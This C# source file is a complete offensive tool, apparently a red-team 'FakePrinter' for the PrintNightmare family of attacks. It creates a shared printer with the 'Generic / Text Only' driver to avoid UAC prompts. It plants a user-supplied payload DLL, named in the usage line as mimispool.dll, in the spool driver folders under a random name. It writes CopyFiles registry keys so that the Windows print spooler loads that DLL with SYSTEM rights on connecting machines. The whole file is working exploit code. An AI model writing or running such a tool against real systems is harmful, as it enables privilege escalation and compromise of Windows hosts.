using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace DeployPrinterNightmare
{
    class Program
    {

        //Some of these printer attrs looks interesting? hmmm
        const uint PRINTER_ATTRIBUTE_QUEUED = 0x00000001;
        const uint PRINTER_ATTRIBUTE_DIRECT = 0x00000002;
        const uint PRINTER_ATTRIBUTE_DEFAULT = 0x00000004;
        const uint PRINTER_ATTRIBUTE_SHARED = 0x00000008;
        const uint PRINTER_ATTRIBUTE_NETWORK = 0x00000010;
        const uint PRINTER_ATTRIBUTE_HIDDEN = 0x00000020;
        const uint PRINTER_ATTRIBUTE_LOCAL = 0x00000040;

        const uint PRINTER_ATTRIBUTE_ENABLE_DEVQ = 0x00000080;
        const uint PRINTER_ATTRIBUTE_KEEPPRINTEDJOBS = 0x00000100;
        const uint PRINTER_ATTRIBUTE_DO_COMPLETE_FIRST = 0x00000200;

        const uint PRINTER_ATTRIBUTE_WORK_OFFLINE = 0x00000400;
        const uint PRINTER_ATTRIBUTE_ENABLE_BIDI = 0x00000800;
        const uint PRINTER_ATTRIBUTE_RAW_ONLY = 0x00001000;
        const uint PRINTER_ATTRIBUTE_PUBLISHED = 0x00002000;


        const uint APD_STRICT_UPGRADE = 0x00000001;
        const uint APD_STRICT_DOWNGRADE = 0x00000002;
        const uint APD_COPY_ALL_FILES = 0x00000004;
        const uint APD_COPY_NEW_FILES = 0x00000008;
        const uint APD_COPY_FROM_DIRECTORY = 0x00000010;

        
        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool GetPrinterDriverDirectory(StringBuilder pName, StringBuilder pEnv, int Level, [Out] StringBuilder outPath, int bufferSize, ref int Bytes);

        //http://msdn.microsoft.com/en-us/library/windows/desktop/dd183343(v=vs.85).aspx
        [DllImport("winspool.drv", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        private static extern IntPtr AddPrinter(string pName, uint Level, [In] ref PRINTER_INFO_2 pPrinter);


        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern Int32 AddPrinterDriverEx(String pName, UInt32 Level, ref DRIVER_INFO_3 pDriverInfo, UInt32 dwFileCopyFlags);


        [DllImport("winspool.drv", SetLastError = true)]
        private static extern bool ClosePrinter(IntPtr phPrinter);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct PRINTER_INFO_2
        {
            public string pServerName;
            public string pPrinterName;
            public string pShareName;
            public string pPortName;
            public string pDriverName;
            public string pComment;
            public string pLocation;
            public IntPtr pDevMode;
            public string pSepFile;
            public string pPrintProcessor;
            public string pDatatype;
            public string pParameters;
            public IntPtr pSecurityDescriptor;
            public uint Attributes;
            public uint Priority;
            public uint DefaultPriority;
            public uint StartTime;
            public uint UntilTime;
            public uint Status;
            public uint cJobs;
            public uint AveragePPM;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct DRIVER_INFO_3
        {
            public uint cVersion;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pEnvironment;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDriverPath;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDataFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pConfigFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pHelpFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDependentFiles;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pMonitorName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDefaultDataType;
        }

        private static void AddPrinter(string printerName, string portName, string driverName)
        {
            PRINTER_INFO_2 pi = new PRINTER_INFO_2()
            {
                pServerName = null,
                pPrinterName = printerName,
                pShareName = printerName,
                pPortName = portName,
                pDriverName = driverName,
                pLocation = "",
                pDevMode = new IntPtr(0),
                pSepFile = "",
                pDatatype = "RAW",
                pParameters = "",
                pSecurityDescriptor = new IntPtr(0),

                //Printer is shared
                Attributes = PRINTER_ATTRIBUTE_SHARED
            };


            var hPrt = AddPrinter(null, 2, ref pi);
            if (hPrt == IntPtr.Zero)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }

            ClosePrinter(hPrt);
        }



        private static void AddPrinterDriver(string driverName, string driverPath, string dataPath, string configPath, string helpPath)
        {
            DRIVER_INFO_3 driverInfo = new DRIVER_INFO_3()
            {
                cVersion = 3,
                pName = driverName,
                pEnvironment = null,
                pDriverPath = driverPath,
                pDataFile = dataPath,
                pConfigFile = configPath,
                pHelpFile = helpPath,
                pDependentFiles = "",
                pMonitorName = null,
                pDefaultDataType = "RAW"

            };

            if (AddPrinterDriverEx(null, 3, ref driverInfo, APD_COPY_NEW_FILES | APD_COPY_FROM_DIRECTORY) == 0)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }

        private static string GetPrinterDirectory()
        {
            StringBuilder str = new StringBuilder(1024);
            int i = 0;
            GetPrinterDriverDirectory(null, null, 1, str, 1024, ref i);

            return str.ToString();
        }


        private static void CopyFile(string fromPath, string destPath)
        {
            Console.WriteLine($"[+] Copying {fromPath} to {destPath}");
            File.Copy(fromPath, destPath, true);

        }

        static void Main(string[] args)
        {
            Console.WriteLine(@"[<3] @Flangvik - TrustedSec ");

            if (args.Length < 3)
            {

                Console.WriteLine(@"[+] Usage: FakePrinter.exe \path\to\32\bit\mimispool.dll \path\to\64\bit\mimispool.dll MyPrinterName");
                Environment.Exit(0);
            }

            //Cannot be changed, else you will be prompted by UAC for unsafe driver
            var driverName = "Generic / Text Only";


            string _32BitPayloadDllPath = args[0];
            string _64BitPayloadDllPath = args[1];
            string printerName = args[2];

            //Give payload DLL a random name
            string payloadName = $"{Guid.NewGuid().ToString().Replace("-", "")}.dll";


            string driversPath = Environment.SystemDirectory + @"\spool\drivers";

            CopyFile(Environment.SystemDirectory + @"\mscms.dll", Environment.SystemDirectory + $@"\{payloadName}");
            CopyFile(_64BitPayloadDllPath, driversPath + $@"\x64\3\{payloadName}");
            CopyFile(_32BitPayloadDllPath, driversPath + $@"\W32X86\3\{payloadName}");

            //Matching the Generic / Text Only driver
            string driverFileName = "UNIDRV.DLL";
            string dataFileName = "unishare.GPD";
            string configFileName = "UNIDRVUI.DLL";
            string helpFileName = "UNIDRV.HLP";


            var printerDriverPath = GetPrinterDirectory();

            var driverPath = $"{printerDriverPath}\\3\\{driverFileName}";
            var dataPath = $"{printerDriverPath}\\3\\{dataFileName}";
            var configPath = $"{printerDriverPath}\\3\\{configFileName}";
            var helpPath = $"{printerDriverPath}\\3\\{helpFileName}";

            Console.WriteLine($"[+] Adding printer driver => {driverName}!");

            AddPrinterDriver(driverName, driverPath, dataPath, configPath, helpPath);

            Console.WriteLine($"[+] Adding printer => {printerName}!");

            AddPrinter(printerName, "FILE:", driverName);

            //Create Copy files subKey if not there
            var _copyFiles = Microsoft.Win32.Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\{printerName}\CopyFiles");
            _copyFiles.Close();

            Console.WriteLine("[+] Setting 64-bit Registry key");
            var _64BItKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\{printerName}\CopyFiles\{Guid.NewGuid().ToString().Replace("-", "")}");
            _64BItKey.SetValue("Directory", @"x64\3", RegistryValueKind.String);
            _64BItKey.SetValue("Files", new string[1] { payloadName }, RegistryValueKind.MultiString);
            _64BItKey.SetValue("Module", "mscms.dll", RegistryValueKind.String);
            _64BItKey.Close();

            Console.WriteLine("[+] Setting 32-bit Registry key");
            var _32BItKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\{printerName}\CopyFiles\{Guid.NewGuid().ToString().Replace("-", "")}");
            _32BItKey.SetValue("Directory", @"W32X86\3", RegistryValueKind.String);
            _32BItKey.SetValue("Files", new string[1] { payloadName }, RegistryValueKind.MultiString);
            _32BItKey.SetValue("Module", "mscms.dll", RegistryValueKind.String);
            _32BItKey.Close();

            Console.WriteLine("[+] Setting '*' Registry key");
            var _uniBitKey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\{printerName}\CopyFiles\{Guid.NewGuid().ToString().Replace("-", "")}");
            _uniBitKey.SetValue("Directory", "", RegistryValueKind.String);
            _uniBitKey.SetValue("Files", new string[] { }, RegistryValueKind.MultiString);
            _uniBitKey.SetValue("Module", payloadName, RegistryValueKind.String);
            _uniBitKey.Close();
        }
    }
}
